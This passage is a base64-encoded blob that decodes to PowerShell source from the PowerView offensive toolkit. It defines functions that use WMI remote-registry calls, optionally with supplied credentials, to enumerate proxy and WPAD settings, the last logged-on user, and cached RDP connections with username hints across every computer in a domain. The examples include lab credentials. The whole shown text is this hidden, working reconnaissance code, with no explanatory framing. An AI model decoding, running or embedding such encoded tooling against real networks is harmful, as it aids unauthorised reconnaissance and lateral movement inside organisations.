ob3I6IFdpbGwgU2Nocm9lZGVyIChAaGFybWoweSkgIApMaWNlbnNlOiBCU0QgMy1DbGF1c2UgIApSZXF1aXJlZCBEZXBlbmRlbmNpZXM6IE5vbmUgIAoKLkRFU0NSSVBUSU9OCgpFbnVtZXJhdGVzIHRoZSBwcm94eSBzZXJ2ZXIgYW5kIFdQQUQgc3BlY2lmaWNhdGlvbiBmb3IgdGhlIGN1cnJlbnQgdXNlcgpvbiB0aGUgbG9jYWwgbWFjaGluZSAoZGVmYXVsdCksIG9yIGEgbWFjaGluZSBzcGVjaWZpZWQgd2l0aCAtQ29tcHV0ZXJOYW1lLgpJdCBkb2VzIHRoaXMgYnkgZW51bWVyYXRpbmcgc2V0dGluZ3MgZnJvbQpIS1U6U09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cSW50ZXJuZXQgU2V0dGluZ3MuCgouUEFSQU1FVEVSIENvbXB1dGVyTmFtZQoKU3BlY2lmaWVzIHRoZSBzeXN0ZW0gdG8gZW51bWVyYXRlIHByb3h5IHNldHRpbmdzIG9uLiBEZWZhdWx0cyB0byB0aGUgbG9jYWwgaG9zdC4KCi5QQVJBTUVURVIgQ3JlZGVudGlhbAoKQSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0gb2JqZWN0IG9mIGFsdGVybmF0ZSBjcmVkZW50aWFscwpmb3IgY29ubmVjdGluZyB0byB0aGUgcmVtb3RlIHN5c3RlbS4KCi5FWEFNUExFCgpHZXQtV01JUmVnUHJveHkKCkNvbXB1dGVyTmFtZSAgICAgICAgICAgUHJveHlTZXJ2ZXIgICAgICAgICAgICBBdXRvQ29uZmlnVVJMICAgICAgICAgV3BhZAotLS0tLS0tLS0tLS0gICAgICAgICAgIC0tLS0tLS0tLS0tICAgICAgICAgICAgLS0tLS0tLS0tLS0tLSAgICAgICAgIC0tLS0KV0lORE9XUzEgICAgICAgICAgICAgICBodHRwOi8vcHJpbWFyeS50ZXN0Li4uCgouRVhBTVBMRQoKJENyZWQgPSBHZXQtQ3JlZGVudGlhbCAiVEVTVExBQlxhZG1pbmlzdHJhdG9yIgpHZXQtV01JUmVnUHJveHkgLUNyZWRlbnRpYWwgJENyZWQgLUNvbXB1dGVyTmFtZSBwcmltYXJ5LnRlc3RsYWIubG9jYWwKCkNvbXB1dGVyTmFtZSAgICAgICAgICAgIFByb3h5U2VydmVyICAgICAgICAgICAgQXV0b0NvbmZpZ1VSTCAgICAgICAgIFdwYWQKLS0tLS0tLS0tLS0tICAgICAgICAgICAgLS0tLS0tLS0tLS0gICAgICAgICAgICAtLS0tLS0tLS0tLS0tICAgICAgICAgLS0tLQp3aW5kb3dzMS50ZXN0bGFiLmxvY2FsICBwcmltYXJ5LnRlc3RsYWIubG9jYWwKCi5JTlBVVFMKClN0cmluZwoKQWNjZXB0cyBvbmUgb3IgbW9yZSBjb21wdXRlciBuYW1lIHNwZWNpZmljYXRpb24gc3RyaW5ncyAgb24gdGhlIHBpcGVsaW5lIChuZXRiaW9zIG9yIEZRRE4pLgoKLk9VVFBVVFMKClBvd2VyVmlldy5Qcm94eVNldHRpbmdzCgpPdXRwdXRzIGN1c3RvbSBQU09iamVjdHMgd2l0aCB0aGUgQ29tcHV0ZXJOYW1lLCBQcm94eVNlcnZlciwgQXV0b0NvbmZpZ1VSTCwgYW5kIFdQQUQgY29udGVudHMuCiM+CgogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5Qcm94eVNldHRpbmdzJyldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdIb3N0TmFtZScsICdkbnNob3N0bmFtZScsICduYW1lJyldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJENvbXB1dGVyTmFtZSA9ICRFbnY6Q09NUFVURVJOQU1FLAoKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKCiAgICBQUk9DRVNTIHsKICAgICAgICBGb3JFYWNoICgkQ29tcHV0ZXIgaW4gJENvbXB1dGVyTmFtZSkgewogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgJFdtaUFyZ3VtZW50cyA9IEB7CiAgICAgICAgICAgICAgICAgICAgJ0xpc3QnID0gJFRydWUKICAgICAgICAgICAgICAgICAgICAnQ2xhc3MnID0gJ1N0ZFJlZ1Byb3YnCiAgICAgICAgICAgICAgICAgICAgJ05hbWVzcGFjZScgPSAncm9vdFxkZWZhdWx0JwogICAgICAgICAgICAgICAgICAgICdDb21wdXRlcm5hbWUnID0gJENvbXB1dGVyCiAgICAgICAgICAgICAgICAgICAgJ0Vycm9yQWN0aW9uJyA9ICdTdG9wJwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRXbWlBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KCiAgICAgICAgICAgICAgICAkUmVnUHJvdmlkZXIgPSBHZXQtV21pT2JqZWN0IEBXbWlBcmd1bWVudHMKICAgICAgICAgICAgICAgICRLZXkgPSAnU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cSW50ZXJuZXQgU2V0dGluZ3MnCgogICAgICAgICAgICAgICAgIyBIS0VZX0NVUlJFTlRfVVNFUgogICAgICAgICAgICAgICAgJEhLQ1UgPSAyMTQ3NDgzNjQ5CiAgICAgICAgICAgICAgICAkUHJveHlTZXJ2ZXIgPSAkUmVnUHJvdmlkZXIuR2V0U3RyaW5nVmFsdWUoJEhLQ1UsICRLZXksICdQcm94eVNlcnZlcicpLnNWYWx1ZQogICAgICAgICAgICAgICAgJEF1dG9Db25maWdVUkwgPSAkUmVnUHJvdmlkZXIuR2V0U3RyaW5nVmFsdWUoJEhLQ1UsICRLZXksICdBdXRvQ29uZmlnVVJMJykuc1ZhbHVlCgogICAgICAgICAgICAgICAgJFdwYWQgPSAnJwogICAgICAgICAgICAgICAgaWYgKCRBdXRvQ29uZmlnVVJMIC1hbmQgKCRBdXRvQ29uZmlnVVJMIC1uZSAnJykpIHsKICAgICAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICAgICAkV3BhZCA9IChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCRBdXRvQ29uZmlnVVJMKQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIltHZXQtV01JUmVnUHJveHldIEVycm9yIGNvbm5lY3RpbmcgdG8gQXV0b0NvbmZpZ1VSTCA6ICRBdXRvQ29uZmlnVVJMIgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBpZiAoJFByb3h5U2VydmVyIC1vciAkQXV0b0NvbmZpZ1VybCkgewogICAgICAgICAgICAgICAgICAgICRPdXQgPSBOZXctT2JqZWN0IFBTT2JqZWN0CiAgICAgICAgICAgICAgICAgICAgJE91dCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdDb21wdXRlck5hbWUnICRDb21wdXRlcgogICAgICAgICAgICAgICAgICAgICRPdXQgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnUHJveHlTZXJ2ZXInICRQcm94eVNlcnZlcgogICAgICAgICAgICAgICAgICAgICRPdXQgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnQXV0b0NvbmZpZ1VSTCcgJEF1dG9Db25maWdVUkwKICAgICAgICAgICAgICAgICAgICAkT3V0IHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1dwYWQnICRXcGFkCiAgICAgICAgICAgICAgICAgICAgJE91dC5QU09iamVjdC5UeXBlTmFtZXMuSW5zZXJ0KDAsICdQb3dlclZpZXcuUHJveHlTZXR0aW5ncycpCiAgICAgICAgICAgICAgICAgICAgJE91dAogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW0dldC1XTUlSZWdQcm94eV0gTm8gcHJveHkgc2V0dGluZ3MgZm91bmQgZm9yICRDb21wdXRlck5hbWUiCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW0dldC1XTUlSZWdQcm94eV0gRXJyb3IgZW51bWVyYXRpbmcgcHJveHkgc2V0dGluZ3MgZm9yICRDb21wdXRlck5hbWUgOiAkXyIKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQoKCmZ1bmN0aW9uIEdldC1XTUlSZWdMYXN0TG9nZ2VkT24gewo8IwouU1lOT1BTSVMKClJldHVybnMgdGhlIGxhc3QgdXNlciB3aG8gbG9nZ2VkIG9udG8gdGhlIGxvY2FsIChvciBhIHJlbW90ZSkgbWFjaGluZS4KCk5vdGU6IFRoaXMgZnVuY3Rpb24gcmVxdWlyZXMgYWRtaW5pc3RyYXRpdmUgcmlnaHRzIG9uIHRoZSBtYWNoaW5lIHlvdSdyZSBlbnVtZXJhdGluZy4KCkF1dGhvcjogV2lsbCBTY2hyb2VkZXIgKEBoYXJtajB5KSAgCkxpY2Vuc2U6IEJTRCAzLUNsYXVzZSAgClJlcXVpcmVkIERlcGVuZGVuY2llczogTm9uZSAgCgouREVTQ1JJUFRJT04KClRoaXMgZnVuY3Rpb24gdXNlcyByZW1vdGUgcmVnaXN0cnkgdG8gZW51bWVyYXRlIHRoZSBMYXN0TG9nZ2VkT25Vc2VyIHJlZ2lzdHJ5IGtleQpmb3IgdGhlIGxvY2FsIChvciByZW1vdGUpIG1hY2hpbmUuCgouUEFSQU1FVEVSIENvbXB1dGVyTmFtZQoKU3BlY2lmaWVzIHRoZSBob3N0bmFtZSB0byBxdWVyeSBmb3IgcmVtb3RlIHJlZ2lzdHJ5IHZhbHVlcyAoYWxzbyBhY2NlcHRzIElQIGFkZHJlc3NlcykuCkRlZmF1bHRzIHRvICdsb2NhbGhvc3QnLgoKLlBBUkFNRVRFUiBDcmVkZW50aWFsCgpBIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXSBvYmplY3Qgb2YgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzCmZvciBjb25uZWN0aW5nIHRvIHRoZSByZW1vdGUgc3lzdGVtLgoKLkVYQU1QTEUKCkdldC1XTUlSZWdMYXN0TG9nZ2VkT24KClJldHVybnMgdGhlIGxhc3QgdXNlciBsb2dnZWQgb250byB0aGUgbG9jYWwgbWFjaGluZS4KCi5FWEFNUExFCgpHZXQtV01JUmVnTGFzdExvZ2dlZE9uIC1Db21wdXRlck5hbWUgV0lORE9XUzEKClJldHVybnMgdGhlIGxhc3QgdXNlciBsb2dnZWQgb250byBXSU5ET1dTMQoKLkVYQU1QTEUKCkdldC1Eb21haW5Db21wdXRlciB8IEdldC1XTUlSZWdMYXN0TG9nZ2VkT24KClJldHVybnMgdGhlIGxhc3QgdXNlciBsb2dnZWQgb250byBhbGwgbWFjaGluZXMgaW4gdGhlIGRvbWFpbi4KCi5FWEFNUExFCgokU2VjUGFzc3dvcmQgPSBDb252ZXJ0VG8tU2VjdXJlU3RyaW5nICdQYXNzd29yZDEyMyEnIC1Bc1BsYWluVGV4dCAtRm9yY2UKJENyZWQgPSBOZXctT2JqZWN0IFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsKCdURVNUTEFCXGRmbS5hJywgJFNlY1Bhc3N3b3JkKQpHZXQtV01JUmVnTGFzdExvZ2dlZE9uIC1Db21wdXRlck5hbWUgUFJJTUFSWS50ZXN0bGFiLmxvY2FsIC1DcmVkZW50aWFsICRDcmVkCgouT1VUUFVUUwoKUG93ZXJWaWV3Lkxhc3RMb2dnZWRPblVzZXIKCkEgUFNDdXN0b21PYmplY3QgY29udGFpbmluZyB0aGUgQ29tcHV0ZXJOYW1lIGFuZCBsYXN0IGxvZ2dlZG9uIHVzZXIuCiM+CgogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5MYXN0TG9nZ2VkT25Vc2VyJyldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdIb3N0TmFtZScsICdkbnNob3N0bmFtZScsICduYW1lJyldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJENvbXB1dGVyTmFtZSA9ICdsb2NhbGhvc3QnLAoKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKCiAgICBQUk9DRVNTIHsKICAgICAgICBGb3JFYWNoICgkQ29tcHV0ZXIgaW4gJENvbXB1dGVyTmFtZSkgewogICAgICAgICAgICAjIEhLRVlfTE9DQUxfTUFDSElORQogICAgICAgICAgICAkSEtMTSA9IDIxNDc0ODM2NTAKCiAgICAgICAgICAgICRXbWlBcmd1bWVudHMgPSBAewogICAgICAgICAgICAgICAgJ0xpc3QnID0gJFRydWUKICAgICAgICAgICAgICAgICdDbGFzcycgPSAnU3RkUmVnUHJvdicKICAgICAgICAgICAgICAgICdOYW1lc3BhY2UnID0gJ3Jvb3RcZGVmYXVsdCcKICAgICAgICAgICAgICAgICdDb21wdXRlcm5hbWUnID0gJENvbXB1dGVyCiAgICAgICAgICAgICAgICAnRXJyb3JBY3Rpb24nID0gJ1NpbGVudGx5Q29udGludWUnCiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRXbWlBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KCiAgICAgICAgICAgICMgdHJ5IHRvIG9wZW4gdXAgdGhlIHJlbW90ZSByZWdpc3RyeSBrZXkgdG8gZ3JhYiB0aGUgbGFzdCBsb2dnZWQgb24gdXNlcgogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgJFJlZyA9IEdldC1XbWlPYmplY3QgQFdtaUFyZ3VtZW50cwoKICAgICAgICAgICAgICAgICRLZXkgPSAnU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cQXV0aGVudGljYXRpb25cTG9nb25VSScKICAgICAgICAgICAgICAgICRWYWx1ZSA9ICdMYXN0TG9nZ2VkT25Vc2VyJwogICAgICAgICAgICAgICAgJExhc3RVc2VyID0gJFJlZy5HZXRTdHJpbmdWYWx1ZSgkSEtMTSwgJEtleSwgJFZhbHVlKS5zVmFsdWUKCiAgICAgICAgICAgICAgICAkTGFzdExvZ2dlZE9uID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICAgICAgICAgJExhc3RMb2dnZWRPbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdDb21wdXRlck5hbWUnICRDb21wdXRlcgogICAgICAgICAgICAgICAgJExhc3RMb2dnZWRPbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdMYXN0TG9nZ2VkT24nICRMYXN0VXNlcgogICAgICAgICAgICAgICAgJExhc3RMb2dnZWRPbi5QU09iamVjdC5UeXBlTmFtZXMuSW5zZXJ0KDAsICdQb3dlclZpZXcuTGFzdExvZ2dlZE9uVXNlcicpCiAgICAgICAgICAgICAgICAkTGFzdExvZ2dlZE9uCiAgICAgICAgICAgIH0KICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW0dldC1XTUlSZWdMYXN0TG9nZ2VkT25dIEVycm9yIG9wZW5pbmcgcmVtb3RlIHJlZ2lzdHJ5IG9uICRDb21wdXRlci4gUmVtb3RlIHJlZ2lzdHJ5IGxpa2VseSBub3QgZW5hYmxlZC4iCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9Cn0KCgpmdW5jdGlvbiBHZXQtV01JUmVnQ2FjaGVkUkRQQ29ubmVjdGlvbiB7CjwjCi5TWU5PUFNJUwoKUmV0dXJucyBpbmZvcm1hdGlvbiBhYm91dCBSRFAgY29ubmVjdGlvbnMgb3V0Z29pbmcgZnJvbSB0aGUgbG9jYWwgKG9yIHJlbW90ZSkgbWFjaGluZS4KCk5vdGU6IFRoaXMgZnVuY3Rpb24gcmVxdWlyZXMgYWRtaW5pc3RyYXRpdmUgcmlnaHRzIG9uIHRoZSBtYWNoaW5lIHlvdSdyZSBlbnVtZXJhdGluZy4KCkF1dGhvcjogV2lsbCBTY2hyb2VkZXIgKEBoYXJtajB5KSAgCkxpY2Vuc2U6IEJTRCAzLUNsYXVzZSAgClJlcXVpcmVkIERlcGVuZGVuY2llczogQ29udmVydEZyb20tU0lEICAKCi5ERVNDUklQVElPTgoKVXNlcyByZW1vdGUgcmVnaXN0cnkgZnVuY3Rpb25hbGl0eSB0byBxdWVyeSBhbGwgZW50cmllcyBmb3IgdGhlCiJXaW5kb3dzIFJlbW90ZSBEZXNrdG9wIENvbm5lY3Rpb24gQ2xpZW50IiBvbiBhIG1hY2hpbmUsIHNlcGFyYXRlZCBieQp1c2VyIGFuZCB0YXJnZXQgc2VydmVyLgoKLlBBUkFNRVRFUiBDb21wdXRlck5hbWUKClNwZWNpZmllcyB0aGUgaG9zdG5hbWUgdG8gcXVlcnkgZm9yIGNhY2hlZCBSRFAgY29ubmVjdGlvbnMgKGFsc28gYWNjZXB0cyBJUCBhZGRyZXNzZXMpLgpEZWZhdWx0cyB0byAnbG9jYWxob3N0Jy4KCi5QQVJBTUVURVIgQ3JlZGVudGlhbAoKQSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0gb2JqZWN0IG9mIGFsdGVybmF0ZSBjcmVkZW50aWFscwpmb3IgY29ubmVjdGluZyB0byB0aGUgcmVtb3RlIHN5c3RlbS4KCi5FWEFNUExFCgpHZXQtV01JUmVnQ2FjaGVkUkRQQ29ubmVjdGlvbgoKUmV0dXJucyB0aGUgUkRQIGNvbm5lY3Rpb24gY2xpZW50IGluZm9ybWF0aW9uIGZvciB0aGUgbG9jYWwgbWFjaGluZS4KCi5FWEFNUExFCgpHZXQtV01JUmVnQ2FjaGVkUkRQQ29ubmVjdGlvbiAgLUNvbXB1dGVyTmFtZSBXSU5ET1dTMi50ZXN0bGFiLmxvY2FsCgpSZXR1cm5zIHRoZSBSRFAgY29ubmVjdGlvbiBjbGllbnQgaW5mb3JtYXRpb24gZm9yIHRoZSBXSU5ET1dTMi50ZXN0bGFiLmxvY2FsIG1hY2hpbmUKCi5FWEFNUExFCgpHZXQtRG9tYWluQ29tcHV0ZXIgfCBHZXQtV01JUmVnQ2FjaGVkUkRQQ29ubmVjdGlvbgoKUmV0dXJucyBjYWNoZWQgUkRQIGluZm9ybWF0aW9uIGZvciBhbGwgbWFjaGluZXMgaW4gdGhlIGRvbWFpbi4KCi5FWEFNUExFCgokU2VjUGFzc3dvcmQgPSBDb252ZXJ0VG8tU2VjdXJlU3RyaW5nICdQYXNzd29yZDEyMyEnIC1Bc1BsYWluVGV4dCAtRm9yY2UKJENyZWQgPSBOZXctT2JqZWN0IFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsKCdURVNUTEFCXGRmbS5hJywgJFNlY1Bhc3N3b3JkKQpHZXQtV01JUmVnQ2FjaGVkUkRQQ29ubmVjdGlvbiAtQ29tcHV0ZXJOYW1lIFBSSU1BUlkudGVzdGxhYi5sb2NhbCAtQ3JlZGVudGlhbCAkQ3JlZAoKLk9VVFBVVFMKClBvd2VyVmlldy5DYWNoZWRSRFBDb25uZWN0aW9uCgpBIFBTQ3VzdG9tT2JqZWN0IGNvbnRhaW5pbmcgdGhlIENvbXB1dGVyTmFtZSBhbmQgY2FjaGVkIFJEUCBpbmZvcm1hdGlvbi4KIz4KCiAgICBbT3V0cHV0VHlwZSgnUG93ZXJWaWV3LkNhY2hlZFJEUENvbm5lY3Rpb24nKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ0hvc3ROYW1lJywgJ2Ruc2hvc3RuYW1lJywgJ25hbWUnKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkQ29tcHV0ZXJOYW1lID0gJ2xvY2FsaG9zdCcsCgogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eQogICAgKQoKICAgIFBST0NFU1MgewogICAgICAgIEZvckVhY2ggKCRDb21wdXRlciBpbiAkQ29tcHV0ZXJOYW1lKSB7CiAgICAgICAgICAgICMgSEtFWV9VU0VSUwogICAgICAgICAgICAkSEtVID0gMjE0NzQ4MzY1MQoKICAgICAgICAgICAgJFdtaUFyZ3VtZW50cyA9IEB7CiAgICAgICAgICAgICAgICAnTGlzdCcgPSAkVHJ1ZQogICAgICAgICAgICAgICAgJ0NsYXNzJyA9ICdTdGRSZWdQcm92JwogICAgICAgICAgICAgICAgJ05hbWVzcGFjZScgPSAncm9vdFxkZWZhdWx0JwogICAgICAgICAgICAgICAgJ0NvbXB1dGVybmFtZScgPSAkQ29tcHV0ZXIKICAgICAgICAgICAgICAgICdFcnJvckFjdGlvbicgPSAnU3RvcCcKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJFdtaUFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQoKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICRSZWcgPSBHZXQtV21pT2JqZWN0IEBXbWlBcmd1bWVudHMKCiAgICAgICAgICAgICAgICAjIGV4dHJhY3Qgb3V0IHRoZSBTSURzIG9mIGRvbWFpbiB1c2VycyBpbiB0aGlzIGhpdmUKICAgICAgICAgICAgICAgICRVc2VyU0lEcyA9ICgkUmVnLkVudW1LZXkoJEhLVSwgJycpKS5zTmFtZXMgfCBXaGVyZS1PYmplY3QgeyAkXyAtbWF0Y2ggJ1MtMS01LTIxLVswLTldKy1bMC05XSstWzAtOV0rLVswLTldKyQnIH0KCiAgICAgICAgICAgICAgICBGb3JFYWNoICgkVXNlclNJRCBpbiAkVXNlclNJRHMpIHsKICAgICAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRVc2VyTmFtZSA9IENvbnZlcnRGcm9tLVNJRCAtT2JqZWN0U2lkICRVc2VyU0lEIC1DcmVkZW50aWFsICRDcmVkZW50aWFsCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkVXNlck5hbWUgPSBDb252ZXJ0RnJvbS1TSUQgLU9iamVjdFNpZCAkVXNlclNJRAogICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAjIHB1bGwgb3V0IGFsbCB0aGUgY2FjaGVkIFJEUCBjb25uZWN0aW9ucwogICAgICAgICAgICAgICAgICAgICAgICAkQ29ubmVjdGlvbktleXMgPSAkUmVnLkVudW1WYWx1ZXMoJEhLVSwiJFVzZXJTSURcU29mdHdhcmVcTWljcm9zb2Z0XFRlcm1pbmFsIFNlcnZlciBDbGllbnRcRGVmYXVsdCIpLnNOYW1lcwoKICAgICAgICAgICAgICAgICAgICAgICAgRm9yRWFjaCAoJENvbm5lY3Rpb24gaW4gJENvbm5lY3Rpb25LZXlzKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIG1ha2Ugc3VyZSB0aGlzIGtleSBpcyBhIGNhY2hlZCBjb25uZWN0aW9uCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJENvbm5lY3Rpb24gLW1hdGNoICdNUlUuKicpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkVGFyZ2V0U2VydmVyID0gJFJlZy5HZXRTdHJpbmdWYWx1ZSgkSEtVLCAiJFVzZXJTSURcU29mdHdhcmVcTWljcm9zb2Z0XFRlcm1pbmFsIFNlcnZlciBDbGllbnRcRGVmYXVsdCIsICRDb25uZWN0aW9uKS5zVmFsdWUKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEZvdW5kQ29ubmVjdGlvbiA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkRm91bmRDb25uZWN0aW9uIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0NvbXB1dGVyTmFtZScgJENvbXB1dGVyCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEZvdW5kQ29ubmVjdGlvbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdVc2VyTmFtZScgJFVzZXJOYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEZvdW5kQ29ubmVjdGlvbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdVc2VyU0lEJyAkVXNlclNJRAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRGb3VuZENvbm5lY3Rpb24gfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnVGFyZ2V0U2VydmVyJyAkVGFyZ2V0U2VydmVyCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEZvdW5kQ29ubmVjdGlvbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdVc2VybmFtZUhpbnQnICROdWxsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEZvdW5kQ29ubmVjdGlvbi5QU09iamVjdC5UeXBlTmFtZXMuSW5zZXJ0KDAsICdQb3dlclZpZXcuQ2FjaGVkUkRQQ29ubmVjdGlvbicpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEZvdW5kQ29ubmVjdGlvbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAjIHB1bGwgb3V0IGFsbCB0aGUgY2FjaGVkIHNlcnZlciBpbmZvIHdpdGggdXNlcm5hbWUgaGludHMKICAgICAgICAgICAgICAgICAgICAgICAgJFNlcnZlcktleXMgPSAkUmVnLkVudW1LZXkoJEhLVSwiJFVzZXJTSURcU29mdHdhcmVcTWljcm9zb2Z0XFRlcm1pbmFsIFNlcnZlciBDbGllbnRcU2VydmVycyIpLnNOYW1lcwoKICAgICAgICAgICAgICAgICAgICAgICAgRm9yRWFjaCAoJFNlcnZlciBpbiAkU2VydmVyS2V5cykgewoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRVc2VybmFtZUhpbnQgPSAkUmVnLkdldFN0cmluZ1ZhbHVlKCRIS1UsICIkVXNlclNJRFxTb2Z0d2FyZVxNaWNyb3NvZnRcVGVybWluYWwgU2VydmVyIENsaWVudFxTZXJ2ZXJzXCRTZXJ2ZXIiLCAnVXNlcm5hbWVIaW50Jykuc1ZhbHVlCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgJEZvdW5kQ29ubmVjdGlvbiA9IE